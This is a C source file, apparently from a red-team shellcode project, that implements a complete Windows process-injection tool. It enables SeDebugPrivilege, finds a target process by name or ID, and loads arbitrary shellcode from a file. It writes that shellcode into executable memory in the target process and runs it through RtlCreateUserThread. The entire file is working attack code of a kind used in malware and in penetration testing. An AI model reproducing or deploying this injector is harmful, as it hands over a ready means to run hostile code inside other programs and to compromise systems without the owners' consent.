/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

typedef struct _CLIENT_ID {
     PVOID UniqueProcess;
     PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
    IN  HANDLE ProcessHandle,
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN  BOOLEAN CreateSuspended,
    IN  ULONG StackZeroBits,
    IN  OUT  PULONG StackReserved,
    IN  OUT  PULONG StackCommit,
    IN  PVOID StartAddress,
    IN  PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientID);
    
BOOL EnablePrivilege(PCHAR szPrivilege){
    HANDLE           hToken;
    BOOL             bResult;
    LUID             luid;
    TOKEN_PRIVILEGES tp;

    // open token for current process
    bResult = OpenProcessToken(GetCurrentProcess(),
      TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    if(!bResult) return FALSE;
    
    // lookup privilege
    bResult = LookupPrivilegeValue(NULL, szPrivilege, &luid);
    if(bResult){
      tp.PrivilegeCount           = 1;
      tp.Privileges[0].Luid       = luid;
      tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

      // adjust token
      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    }
    CloseHandle(hToken);
    return bResult;
}

// display error message for last error code
VOID xstrerror (PCHAR fmt, ...){
    PCHAR  error=NULL;
    va_list arglist;
    CHAR   buffer[1024];
    DWORD   dwError=GetLastError();
    
    va_start(arglist, fmt);
    vsnprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
          (LPSTR)&error, 0, NULL))
    {
      printf("  [ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      printf("  [ %s error : %08lX\n", buffer, dwError);
    }
}

DWORD name2pid(PCHAR procName){
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          pid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if(!lstrcmpi(pe32.szExeFile, procName)){
          pid=pe32.th32ProcessID;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return pid;
}

BOOL injectPIC(DWORD id, LPVOID code, DWORD codeLen) {
    SIZE_T                wr;
    HANDLE                hp,ht;
    LPVOID                cs;
    RtlCreateUserThread_t pRtlCreateUserThread;
    HMODULE               hn;
    CLIENT_ID             cid;
    NTSTATUS              nt=~0UL;
    DWORD                 t;
    
    // 1. resolve API address 
    hn = GetModuleHandle("ntdll.dll");
    pRtlCreateUserThread=(RtlCreateUserThread_t)
        GetProcAddress(hn, "RtlCreateUserThread");
    
    printf("  [ opening process %li\n", id);
    // 2. open the target process
    hp=OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
    
    if(hp == NULL) return FALSE;
    
    // 3. allocate executable-read-write (XRW) memory for payload
    printf("  [ allocating memory for payload.\n");
    cs=VirtualAllocEx(hp, NULL, codeLen, 
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    printf("  [ writing code to %p.\n", cs);
    // 4. copy the payload to remote memory
    WriteProcessMemory(hp, cs, code, codeLen, &wr); 
    VirtualProtectEx(hp, cs, codeLen, PAGE_EXECUTE_READ, &t);
    
    printf("  [ press any key to continue.\n");
    getchar();
    
    // 5. execute payload in remote process
    printf("  [ creating new thread.\n");
    nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
      NULL, cs, NULL, &ht, &cid);
    
    //AttachConsole(id);
    
    printf("  [ nt status is %lx\n", nt);
    WaitForSingleObject(ht, INFINITE);
    
    // 6. close remote thread handle
    CloseHandle(ht);
    
    // 7. free remote memory
    printf("  [ freeing memory.\n");
    VirtualFreeEx(hp, cs, codeLen, MEM_RELEASE | MEM_DECOMMIT);

    // 8. close remote process handle
    CloseHandle(hp);
    return nt == 0; // STATUS_SUCCESS
}

DWORD getdata(PCHAR path, LPVOID *data){
    HANDLE hf;
    DWORD  len,rd=0;
    
    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *data=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *data, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

int main(int argc, char *argv[]){
    LPVOID code;
    SIZE_T code_len;
    DWORD  pid;

    if (argc != 3){
      printf("\n  [ usage: inject <process id | process name> <payload.bin>\n");
      return 0;
    }
    
    if(!EnablePrivilege(SE_DEBUG_NAME)) {
      printf("  [ cannot enable SeDebugPrivilege.\n");
    }
    
    // get pid
    pid=atoi(argv[1]);
    if(pid==0) pid=name2pid(argv[1]);
    
    if(pid==0) {
      printf("  [ unable to obtain process id.\n");
      return 0;
    }
    // pic
    code_len = getdata(argv[2], &code);
    if(code_len == 0) {
      printf("  [ unable to read payload.\n");
      return 0;
    }
    injectPIC(pid, code, code_len);
    free(code);
    return 0;
}
